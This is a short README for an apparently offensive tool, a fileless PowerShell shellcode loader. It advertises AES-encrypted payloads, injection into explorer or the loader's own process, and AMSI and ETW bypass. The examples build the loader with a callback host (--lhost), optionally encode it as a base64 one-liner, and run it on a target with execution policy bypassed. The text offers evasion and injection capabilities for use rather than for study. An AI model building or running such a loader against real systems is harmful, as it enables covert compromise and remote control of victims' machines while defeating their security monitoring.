# powershell

PowerShell shellcode loader (no files on disk).

- Reflection-based P/Invoke (no `Add-Type`)
- AES-256-CBC decryption
- Remote process injection (default: `explorer`) or `--self`
- AMSI + ETW bypass (arch-aware)
- RW -> RX

## Example

```bash
# Default: remote injection into explorer
python3 build_powershell.py --lhost 192.168.x.x

# Self-injection
python3 build_powershell.py --lhost 192.168.x.x --self

# Base64 one-liner
python3 build_powershell.py --lhost 192.168.x.x --enc
```

Run on target:

```powershell
powershell -ep bypass -f loader.ps1
```
